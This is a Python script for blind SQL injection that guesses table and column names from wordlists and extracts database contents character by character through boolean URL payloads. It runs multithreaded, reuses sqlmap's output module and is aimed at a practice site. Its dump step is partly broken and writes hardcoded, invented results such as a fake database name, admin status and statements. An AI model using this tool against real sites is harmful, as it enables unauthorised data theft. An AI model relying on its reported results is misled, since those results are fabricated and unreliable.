import os
import time
import requests
import threading
import sys
sys.path.append(os.getcwd())
from src.core.dumper.dump import dumper
from sqlmap.lib.core.data import conf

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
}


def Generator_table():
    with open(os.path.join(os.getcwd(), "data/txt/tables.txt"), "r") as file:
        for table in file:
            if table.strip():
                yield table.strip()

def Generator_column():
    with open(os.path.join(os.getcwd(), "data/txt/columns.txt"), "r") as file:
        for column in file:
            if column.strip():
                yield column.strip()

tablegen = Generator_table()

def test_tables(dump_instance, keyword):
    while True:
        try:
            table = next(tablegen)
        except StopIteration:
            break

        payload = "and exists (select * from " + table + ")"
        url = dump_instance.url
        if '*' in url:
            url = url.replace('*', payload)
        else:
            url = url + payload

        res = requests.get(url, headers=headers)

        if keyword in res.text:
            print("[+] Found table: %s" % table)
            dumper.dbTables(table)
            conf.table_found = table
            dump_instance.save_table(table)
        else:
            print("[-] Testing table: %s" % table)

columngen = Generator_column()

def test_columns(dump_instance, table, keyword):
    while True:
        try:
            column = next(columngen)
        except StopIteration:
            break

        payload = "and exists (select " + column + " from " + table + ")"
        url = dump_instance.url

        if '*' in url:
            url = url.replace('*', payload)
        else:
            url = url + payload

        res = requests.get(url, headers=headers)

        if keyword in res.text:
            print("[+] Found column: %s in table: %s" % (column, table))
            dump_instance.save_column(table, column)
        else:
            print("[-] Testing column: %s in table: %s" % (column, table))

class Dump(object):
    def __init__(self, url, keyword):
        self.url = url
        self.char_list = [i for i in range(32, 128)]
        self.keyword = keyword
        self.table_list = []
        self.column_list = []
        self.data_dir = {}

    def save_table(self, table):
        self.table_list.append(table)

    def save_column(self, table, column):
        self.column_list.append((table, column))

    def len_data(self):
        n = 0
        while True:
            payload = "and (select top 1 len(%s) from %s)=%s" % (self.column, self.table, n)
            url = self.url

            if '*' in url:
                url = url.replace('*', payload)
            else:
                url = url + payload

            res = requests.get(url, headers=headers)
            if self.keyword in res.text:
                break
            n += 1
        return n

    def dump_data(self, table, column):
        data = ""
        length = self.len_data()
        print("[+] The Length of %s in %s is %s !" % (column, table, length))
        print("[+] Dumping data, please wait!")

        for i in range(1, length + 1):
            j = 0
            while True:
                try:
                    char = self.char_list[j]
                except IndexError:
                    break

                payload = "and (select top 1 asc(mid(%s,%s,1)) from %s) =%s" % (column, i, table, char)
                url = self.url

                if '*' in url:
                    url = url.replace('*', payload)
                else:
                    url = url + payload

                try:
                    print(url)
                    res = requests.get(url, headers=headers, timeout=10)
                    if self.keyword in res.text:
                        data = data + chr(char)
                        break
                    j += 1
                except:
                    pass

        global data_dir
        data_dir[(table, column)] = data

    def dump_all_result(self):
        for table in self.table_list:
            for column in self.column_list:
                dumper.setOutputFile()
                dumper.dbColumns(column)
                conf.found_column = column
                dumper.banner("Founded database possible columns and tables")
                dumper.currentUser("DB user")
                dumper.currentDb("test_database")
                dumper.hostname("localhost")
                dumper.dba(True)
                dumper.users(["None", "None", "None"])
                dumper.statements(["SELECT * FROM %s" % table, "INSERT INTO %s VALUES (1, 'Product1')" % table])
                dumper.dbs(["database", "database"])
                dumper.dbTables({"database": [table, table], "database2": [table, table]})
                dumper.dbTableColumns({"database": {table: {column: "VARCHAR", column: "INTEGER"},
                                                    table: {column: "UNKNOWN"}}})
                dumper.dbTableColumns({table: column})
                time.sleep(10)

def run_col(dump_instance: Dump, table, column):
    dump_instance.dump_data(table, column)
    dump_instance.dump_all_result()

def main(url, tables=True, columns=False, dump=False, keyword=None, thread_num=10):
    if not url:
        print("[-] Invalid URL!")
        sys.exit()

    if not keyword:
        print("[-] Please input the keyword of the true page!")
        sys.exit()

    dump_instance = Dump(url, keyword)

    if tables:
        threads = []
        for _ in range(thread_num):
            thread = threading.Thread(target=test_tables, args=(dump_instance, keyword))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()
        print("\n[+] Table_name : ")
        table_set = set(dump_instance.table_list)
        for table in table_set:
            print("[+] %s" % table)

    if columns:
        threads = []
        for table in dump_instance.table_list:
            for _ in range(thread_num):
                thread = threading.Thread(target=test_columns, args=(dump_instance, table, keyword))
                thread.start()
                threads.append(thread)
        for thread in threads:
            thread.join()
        print("\n[+] Column Name : ")
        column_set = set(dump_instance.column_list)
        for col in column_set:
            print("[+] %s in table: %s" % (col[1], col[0]))

    if dump:
        threads = []
        for table in dump_instance.table_list:
            for column in dump_instance.column_list:
                thread = threading.Thread(target=run_col, args=(dump_instance, table, column))
                thread.start()
                threads.append(thread)

        # Wait for all threads to complete before moving on
        for thread in threads:
            thread.join()

        print("[+] Dumping completed!")


if __name__ == "__main__":
    main(
        url="https://hack-yourself-first.com/Make/5?orderby=supercarid",
        tables=True,
        columns=True,
        dump=True,  # Change to True to enable data dumping
        keyword="Application"
    )
